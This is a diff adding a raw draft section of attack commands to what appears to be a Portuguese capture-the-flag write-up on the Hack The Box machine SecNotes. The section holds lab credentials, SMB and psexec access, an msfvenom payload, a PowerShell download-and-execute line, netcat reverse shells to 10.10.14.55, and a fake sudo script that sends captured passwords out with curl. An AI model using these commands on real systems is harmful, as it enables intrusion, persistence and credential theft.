@@ -234,3 +234,111 @@ Com o login do administrator usando o `winexe` temos uma shell de ADMINISTRATOR
 ![18.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/18.jpg)
 
 
+## Rascunho
+
+```
+smbclient //192.168.1.108/raj
+
+
+\\10.10.10.97\new-site
+tyler / 92g!mA8BGjOirkL%OG*&
+
+
+
+crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
+
+
+
+smbmap -u "tyler" -p "92g!mA8BGjOirkL%OG*&" -R new-site -H 10.10.10.97 -P 445
+
+
+mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site /mnt/new-site
+
+
+
+./psexec.py secnotes.htb/tyler:'92g!mA8BGjOirkL%OG*&'@10.10.10.97
+
+
+ 
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=53 -f exe -o reverse.exe
+
+copy \\10.10.14.55\tools\reverse.exe C:\windows\temp\reverse.exe
+
+
+
+dir C:\temp\
+
+
+dir C:\windows\temp
+
+
+.\C:\windows\temp\reverse.exe
+
+
+copy \\10.10.14.55\tools\reverse.exe C:\Users\tyler\AppData\Local\Temp\
+C:\Users\tyler\AppData\Local\Temp\reverse.exe
+
+SafetyKatz.exe
+
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.55/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.55 -Port 53
+
+
+
+
+powershell -c start -verb runas cmd '/c start /D "whoami" bash.exe
+
+
+
+C:\Distros\Ubuntu\temp\shell.sh
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.55 443 >/tmp/f
+
+
+
+C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalStaterootfs\etc\shadow
+
+mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.55 443 1>/tmp/backpipe
+
+
+echo "echo $sudopass>> .hidden/pass.txt" >> .hidden/sudo
+echo "curl http://10.10.14.55:81/?$sudopass" >> .hidden/sudo
+
+
+
+mkdir .hidden
+echo "export PATH=\$HOME/.hidden/:\$PATH:" >> .bashrc
+echo "read -sp\"[sudo] password for $USER: \" sudopass" > .hidden/sudo
+echo "echo \"\"" >> .hidden/sudo
+echo "sleep 2" >> .hidden/sudo
+echo "echo \"Sorry, try again.\"" >> .hidden/sudo
+echo "echo $sudopass>> .hidden/pass.txt" >> .hidden/sudo
+echo "/usr/bin/sudo\$1" >> .hidden/sudo
+chmod+x .hidden/sudo
+
+
+echo "echo $sudopass >> .hidden/pass.txt" >> .hidden/sudo
+echo "curl http://10.10.14.55:81/?$sudopass" >> .hidden/sudo
+
+
+
+
+echo "./.call-me.sh" >> .bashrc
+echo "icacls.exe \"\\\\\\\\10.10.14.55\\\\tools\\\\\" > /dev/null 2>&1" >> .call-me.sh
+chmod u+x .call-me.sh
+
+
+
+
+C:\Windows\System32\bash.exe -c "mknod /tmp/backpipe4 p && /bin/sh 0</tmp/backpipe4 | nc 10.10.14.55 53 1>/tmp/backpipe4"
+
+
+
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c
+
+
+winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
+```
